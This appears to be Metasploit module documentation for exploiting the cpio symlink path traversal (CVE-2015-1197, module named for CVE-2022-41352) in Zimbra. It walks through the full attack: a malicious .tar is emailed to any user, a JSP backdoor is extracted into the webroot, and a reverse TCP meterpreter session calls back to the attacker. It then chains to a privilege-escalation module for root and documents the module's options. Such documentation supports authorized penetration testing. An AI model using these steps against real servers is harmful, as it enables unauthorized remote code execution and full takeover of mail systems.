## Vulnerable Application

This module exploits a symlink-based path traversal vulnerability in `cpio` (that's identified as CVE-2015-1197) that's exploitable in Zimbra. All versions of Zimbra are vulnerable, but the Ubuntu-based versions have the workaround applied by default (ie, `pax` is installed).

To verify a host is vulnerable, ensure that `pax` is not installed on the host. Also, validate that `cpio` is listed in `amavisd.conf` as an option to extract .tar/.cpio files:

```
[ron@mail tmp]$ sudo cat /opt/zimbra/conf/amavisd.conf | grep cpio
[...]

  [['cpio','tar'], \&do_pax_cpio, ['pax', 'gcpio', 'cpio'] ],
```

Note that this can be chained with CVE-2022-37393 (`exploit/linux/local/zimbra_slapper_priv_esc`), which is currently unpatched, to escalate to root.

## Verification Steps

To exploit Zimbra, first load the module and generate the .tar file:

```
msf6 > use exploit/linux/http/zimbra_cpio_cve_2022_41352
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/zimbra_cpio_cve_2022_41352) > set LHOST 172.16.166.147
LHOST => 172.16.166.147
msf6 exploit(linux/http/zimbra_cpio_cve_2022_41352) > set RHOSTS 172.16.166.158
RHOSTS => 172.16.166.158
msf6 exploit(linux/http/zimbra_cpio_cve_2022_41352) > exploit
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 172.16.166.147:4444 
[*] Encoding the payload as a .jsp file
[*] Adding symlink to path to .tar file: /opt/zimbra/jetty_base/webapps/zimbra/
[*] Adding target file to the archive: public/bdhg.jsp
[+] payload.tar stored at /home/ron/.msf4/local/payload.tar
[+] File created! Email the file above to any user on the target Zimbra server

[...] waiting [...]
```

Then, email that file to any user (including a non-existent mailbox) on the Zimbra server. Once the payload arrives at Zimbra, Zimbra should try to extract it to check for malware with no user interaction. Metasploit should see the malicious file extracted and get a session:

```
[...]

[*] Trying to trigger the backdoor @ public/bdhg.jsp every 5s [backgrounding]...

[file emailed]

[*] Sending stage (3045348 bytes) to 172.16.166.158

msf6 exploit(linux/http/zimbra_cpio_cve_2022_41352) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid

```

For bonus points, use a different module to get root:

```
msf6 exploit(linux/http/zimbra_cpio_cve_2022_41352) > use exploit/linux/local/zimbra_slapper_priv_esc
[*] Using configured payload linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/local/zimbra_slapper_priv_esc) > set SESSION 1
SESSION => 1

msf6 exploit(linux/local/zimbra_slapper_priv_esc) > exploit

## Options

### `FILENAME`

The filename to generate - defaults to `payload.tar`, but can be changed on the filesystem or whatever.

### `TARGET_PATH`

The absolute path where the payload will extract to. The default is the webroot, which is usually what you want

### `TARGET_FILENAME`

The actual filename. It really should end with `.jsp`, otherwise it won't execute.

By default, it's a random string with `.jsp` on the end, in the `public/` folder. That should work fine, especially because we can't overwrite files and don't want to use the same payload name more than once.

### `SYMLINK_FILENAME`

The path used for the symlink inside the archive; you probably won't ever want to change this (default: random)

### `TRIGGER_PAYLOAD`

A boolean, default `true`, that determines whether we use HTTP requests to trigger the .jsp payload. Set to `false` to trigger the payload manually.

### `ListenerTimeout`

The number of seconds to wait for a new session (default = `0`, or infinite).

### `CheckInterval`

The frequency with which to check for the payload on the server. Every `CheckInterval`, it performs an HTTP request to the payload path.
